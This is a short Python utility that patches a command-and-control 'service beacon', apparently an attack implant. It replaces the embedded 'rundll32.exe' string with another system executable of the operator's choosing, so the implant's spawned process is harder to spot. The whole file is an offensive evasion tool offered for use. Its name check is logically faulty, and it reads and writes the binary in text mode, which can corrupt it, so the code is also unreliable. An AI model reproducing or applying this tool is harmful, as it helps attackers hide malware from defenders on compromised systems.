import sys

if len(sys.argv) != 2:
    print ('\nUSAGE: %s <path to service beacon>\n' % sys.argv[0])
    print ('Drag and Drop the service beacon onto this py script OR provide full path as one and only argument.')

else:
    src_file = sys.argv[1]
    beacon_data = None

    with open(src_file, 'r') as beacon_file:
    #with open(src_file, 'rb') as beacon_file:   <<< May not be able to read the exe as bytes and substitute str on line 27
        beacon_data = beacon_file.read()

    if beacon_data is not None:
        new_exe = input(" What would you like to replace rundll32.exe with?\n It must be an executable with a name that is 8 characters (i.e., upnpcont.exe)\n It must also be in system32 for a x64 service beacon and SysWOW64 for a x86 service beacon.\n Include the .exe when you give your input.\n\n Input: ")
        
        if len(new_exe) != 12 and not new_exe.endswith('.exe'):
            print("[-] ERROR: invalid executable name; must be 8 characters and ends with '.exe'")
            exit(1)
        
        print('[*] Replacing rundll32.exe with %s ' % new_exe)
        beacon_data = beacon_data.replace('rundll32.exe', new_exe)
        dst_file = '%s_swap_%s' % (src_file[:-4], new_exe)
        
        with open (dst_file, 'w') as beacon_file:
        #Writing file as str (w)... if line 11 is changed to rb, this line needs to reflect wb (bytes oriented object)
            beacon_file.write(beacon_data)
    else:
        print('[-] ERROR: Unable to read %s' % src_file)
